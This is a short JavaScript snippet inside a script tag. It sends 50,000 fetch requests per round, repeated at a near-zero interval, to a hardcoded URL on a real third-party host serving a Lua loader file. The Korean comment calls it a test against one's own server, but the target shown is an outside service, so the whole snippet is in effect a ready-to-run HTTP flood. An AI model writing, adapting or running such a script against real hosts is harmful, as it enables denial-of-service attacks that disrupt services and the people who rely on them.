<script>
const url = "https://api.luarmor.net/files/v4/loaders/86943e213581a8598e8a38e5bba4c975.lua"; // 테스트용 내 서버 주소로 변경
const requestsPerSecond = 50000;

function sendRequests() {
  for (let i = 0; i < requestsPerSecond; i++) {
    fetch(url)
      .then(response => console.log("요청 성공", response.status))
      .catch(err => console.log("요청 실패", err));
  }
}

  
setInterval(sendRequests, 0.010);
</script>
